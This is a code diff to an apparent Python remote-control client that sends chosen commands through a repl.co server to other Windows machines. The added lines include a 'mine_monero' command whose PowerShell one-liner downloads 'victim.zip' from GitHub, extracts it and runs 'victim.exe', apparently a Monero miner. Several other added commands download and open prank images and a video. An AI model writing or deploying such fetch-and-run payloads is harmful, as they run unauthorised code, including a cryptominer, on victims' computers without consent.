@@ -1,4 +1,3 @@
-import sys
 import os
 import requests
 print("a")
@@ -26,7 +25,14 @@ while True:
 		command_to_send = "start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 	elif command_to_send == "barak":
 		command_to_send = "start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160"
-
+	elif command_to_send == "mine_monero":
+		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/victim.zip?raw=true', 'victim.zip');Expand-Archive -Path victim.zip -DestinationPath victim;cd victim;./victim.exe"
+	elif command_to_send == "barak2":
+		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://media.discordapp.net/stickers/865029615457271828.png?size=160', 'barak.png');barak.png"
+	elif command_to_send == "barak3":
+		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/646407583074091011/916798477357449216/barakVID.mp4', 'barakVID.mp4');barakVID.mp4"
+	elif command_to_send == "barak4":
+		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png', 'barak4.png');barak4.png"
 	pre = requests.get(url="https://epic-servering-but-pytyohn.jonathanbreitg.repl.co")
 	pre = pre.text
 	obj = {"data":str(command_to_send)}
